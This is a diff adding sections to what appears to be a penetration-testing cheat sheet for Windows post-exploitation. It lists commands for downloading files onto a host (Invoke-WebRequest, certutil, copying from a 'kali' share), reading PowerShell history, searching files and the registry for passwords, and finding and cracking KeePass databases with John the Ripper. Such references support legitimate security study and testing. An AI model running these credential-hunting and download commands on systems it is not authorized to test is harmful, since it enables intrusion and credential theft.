@@ -1,4 +1,18 @@
 - PowerView Cheat Sheet
+### File transfers
+- Powershell
+```
+powershell -command Invoke-WebRequest -Uri <URL> -Outfile C:\\temp\\<FILE>
+```
+```
+iwr -uri <URL> -Outfile <FILE>
+```
+```
+certutil -urlcache -split -f "<URL>" <FILE>
+```
+```
+copy \\kali\share\file .
+```
 ### Recursive File Listing
 ```
 dir /s /a \\<HOST>\<PATH> > <LOGFILE>
@@ -11,6 +25,38 @@ makeab <LOGFILE> <COMPRESSED>.zip
 ```
 ```
 extract <COMPRESSED>.zip <LOGFILE>
+```
+### Powershell History
+```
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+### Searching for Passwords
+```
+dir .s *pass* == *.config
+```
+```
+findstr /si password *.xml *.ini *.txt
+```
+### Searching registry for passwords
+```
+reg query HKLM /f password /t REG_SZ /s
+```
+```
+reg query HKCU /f password /t REG_SZ /s
+```
+### Find KDBX files
+```
+dir /s /b *.kdbx
+```
+```
+Get-ChildItem -Recurse -Filter *.kdbx
+```
+### KDBX cracking
+```
+keepass2john database.kdbx > keepasshash
+```
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash
 ```
 ### Enable Command Prompt
 ```
